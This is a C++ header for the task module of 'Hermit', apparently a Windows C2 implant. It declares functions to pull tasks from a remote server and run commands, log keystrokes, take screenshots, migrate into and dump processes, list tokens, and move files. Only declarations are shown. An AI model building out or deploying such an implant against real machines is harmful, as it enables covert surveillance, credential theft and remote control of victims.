#ifndef HERMIT_TASK_HPP
#define HERMIT_TASK_HPP

#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <dbghelp.h>
#include <psapi.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <string>
#include <tlhelp32.h>
#include <vector>
#include "common.hpp"
#include "convert.hpp"
#include "fs.hpp"
#include "ip.hpp"
#include "keylog.hpp"
#include "macros.hpp"
#include "net.hpp"
#include "registry.hpp"
#include "screenshot.hpp"
#include "token.hpp"
#include "utils.hpp"
#include "winhttp.hpp"
#include "winsystem.hpp"

std::wstring GetTask(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath
);

std::wstring ExecuteTaskCat(const std::wstring& wFile);
std::wstring ExecuteTaskCd(const std::wstring& wDestDir);
std::wstring ExecuteTaskCp(const std::wstring& wSrc, const std::wstring& wDest);
std::wstring ExecuteTaskDownload(
    HINTERNET hConnect,
	const std::wstring& wSrc,
	const std::wstring& wDest
);
std::wstring ExecuteTaskExecute(const std::wstring& cmd);
std::wstring ExecuteTaskIp();
std::wstring ExecuteTaskKeyLog(const std::wstring& wLogTime);
std::wstring ExecuteTaskKill();
std::wstring ExecuteTaskLs(const std::wstring& wDir);
std::wstring ExecuteTaskMigrate(const std::wstring& wPid);
std::wstring ExecuteTaskMkdir(const std::wstring& wDir);
std::wstring ExecuteTaskMv(
	const std::wstring& wSrc,
	const std::wstring& wDest
);
std::wstring ExecuteTaskNet();
std::wstring ExecuteTaskProcdump(const std::wstring& wPid);
std::wstring ExecuteTaskPs();
std::wstring ExecuteTaskPsKill(const std::wstring& wPid);
std::wstring ExecuteTaskPwd();
std::wstring ExecuteTaskRegSubKeys(
	const std::wstring& wRootKey,
	const std::wstring& wSubKey,
	BOOL bRecurse
);
std::wstring ExecuteTaskRegValues(
	const std::wstring& wRootKey,
	const std::wstring& wSubKey,
	BOOL bRecurse
);
std::wstring ExecuteTaskRm(const std::wstring& wFile);
std::wstring ExecuteTaskRmdir(const std::wstring& wDir);
std::wstring ExecuteTaskScreenshot(HINSTANCE hInstance, INT nCmdShow);
std::wstring ExecuteTaskSleep(const std::wstring& wSleepTime, INT &nSleep);
std::wstring ExecuteTaskTokenList();
std::wstring ExecuteTaskUpload(
    HINTERNET hConnect,
    const std::wstring& wSrc,
    const std::wstring& wDest
);
std::wstring ExecuteTaskWhoami();
std::wstring ExecuteTask(
	HINSTANCE hInstance,
	INT nCmdShow,
    HINTERNET hConnect,
	const std::wstring& task,
	INT &nSleep
);

BOOL SendTaskResult(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath,
	const std::wstring& task,
	const std::wstring& taskResult
);

#endif // HERMIT_TASK_HPP